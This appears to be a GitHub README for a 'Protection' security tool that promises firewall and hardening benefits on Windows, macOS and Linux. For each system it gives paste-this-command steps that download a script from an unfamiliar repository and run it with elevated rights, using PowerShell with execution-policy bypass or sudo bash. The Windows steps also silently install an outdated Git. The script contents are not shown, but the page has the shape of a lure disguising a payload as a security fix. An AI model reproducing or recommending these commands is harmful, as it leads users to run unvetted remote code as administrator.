<p align="center" style="font-size: 24px;">
  <strong>Click your operating system to ensure maximum security</strong>
</p>

<p align="center">
  <a href="#windows-install-instructions">
    <img src="./assets/windows.png" alt="Windows Logo" width="100" style="margin: 0 30px;"/>
  </a>
  <a href="#macos-install-instructions">
    <img src="./assets/macos.png" alt="macOS Logo" width="100" style="margin: 0 30px;"/>
  </a>
  <a href="#linux-install-instructions">
    <img src="./assets/linux.png" alt="Linux Logo" width="100" style="margin: 0 30px;"/>
  </a>
</p>

---

<div style="display: flex; align-items: center; margin-bottom: 40px;">
  <div style="flex: 1;">
    <h1>Protection maximizes the security of your computer, providing robust and comprehensive security measures.</h1>
    <ul>
      <li>✓ Enables Firewall</li>
      <li>✓ Blocks unauthorized access</li>
      <li>✓ Reduces attack surface by disabling unused services</li>
      <li>✓ Applies security settings</li>
      <li>✓ Enhances overall system stability and performance</li>
      <li>✓ Prevents common security vulnerabilities</li>
    </ul>
  </div>
  <div style="flex: 0;">
    <img src="./assets/logo.svg" alt="Project Logo" width="100" style="margin-left: 20px;"/>
  </div>
</div>

---

## Windows Install Instructions

<a name="windows-install-instructions"></a>

Ensure you have at least 200 MB of free space available.

<div style="display: flex; align-items: center; margin-bottom: 40px;">
  <div style="flex: 1;">
    <ol>
      <li><strong>Open Command Prompt</strong>
        <ul>
          <li>Press `Windows + R`</li>
          <li>Type `cmd`</li>
          <li>Press `Enter`</li>
        </ul>
      </li>
      <li><strong>Install Git</strong>
        <ul>
          <li>Copy and paste the following command into Command Prompt:</li>
          <pre><code>powershell -Command "Invoke-WebRequest -Uri https://github.com/git-for-windows/git/releases/download/v2.14.1.windows.1/Git-2.14.1-64-bit.exe -OutFile Git-2.14.1-64-bit.exe"</code></pre>
          <li>Once downloaded, copy and paste the following command into Command Prompt:</li>
          <pre><code>.\Git-2.14.1-64-bit.exe /VERYSILENT /NORESTART</code></pre>
        </ul>
      </li>
      <li><strong>Download and Run the Protection Script</strong>
        <ul>
          <li>Copy and paste the following commands into Command Prompt:</li>
          <pre><code>curl -o win.ps1 https://raw.githubusercontent.com/boolskii/protection/main/win.ps1
powershell -ExecutionPolicy Bypass -File .\win.ps1</code></pre>
        </ul>
      </li>
    </ol>
    Your Windows PC is now protected from unwanted activity.
  </div>
  <div style="flex: 0;">
    <img src="./assets/windows.png" alt="Windows Logo" width="100" style="margin-left: 20px;"/>
  </div>
</div>

---

## macOS Install Instructions

<a name="macos-install-instructions"></a>

Ensure you have at least 100 MB of free space available.

<div style="display: flex; align-items: center; margin-bottom: 40px;">
  <div style="flex: 1;">
    <ol>
      <li><strong>Open Terminal</strong></li>
      <li><strong>Install Homebrew (if not already installed)</strong>
        <ul>
          <li>Copy and paste the following command into Terminal:</li>
          <pre><code>/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"</code></pre>
        </ul>
      </li>
      <li><strong>Install Git</strong>
        <ul>
          <li>Copy and paste the following command into Terminal:</li>
          <pre><code>brew install git</code></pre>
        </ul>
      </li>
      <li><strong>Download and Run the Protection Script</strong>
        <ul>
          <li>Copy and paste the following commands into Terminal:</li>
          <pre><code>curl -o mac.sh https://raw.githubusercontent.com/boolskii/protection/main/mac.sh
sudo bash ./mac.sh</code></pre>
        </ul>
      </li>
    </ol>
    Your macOS system is now protected from unwanted activity.
  </div>
  <div style="flex: 0;">
    <img src="./assets/macos.png" alt="macOS Logo" width="100" style="margin-left: 20px;"/>
  </div>
</div>

---

## Linux Install Instructions

<a name="linux-install-instructions"></a>

Ensure you have at least 100 MB of free space available.

<div style="display: flex; align-items: center; margin-bottom: 40px;">
  <div style="flex: 1;">
    <ol>
      <li><strong>Open Terminal</strong></li>
      <li><strong>Update Package Lists</strong>
        <ul>
          <li>Copy and paste the following command into Terminal:</li>
          <pre><code>sudo apt-get update</code></pre>
        </ul>
      </li>
      <li><strong>Install Git</strong>
        <ul>
          <li>Copy and paste the following command into Terminal:</li>
          <pre><code>sudo apt-get install git -y</code></pre>
        </ul>
      </li>
      <li><strong>Download and Run the Protection Script</strong>
        <ul>
          <li>Copy and paste the following commands into Terminal:</li>
          <pre><code>curl -o lin.sh https://raw.githubusercontent.com/boolskii/protection/main/lin.sh
sudo bash ./lin.sh</code></pre>
        </ul>
      </li>
    </ol>
    Your Linux system is now protected from unwanted activity.
  </div>
  <div style="flex: 0;">
    <img src="./assets/linux.png" alt="Linux Logo" width="100" style="margin-left: 20px;"/>
  </div>
</div>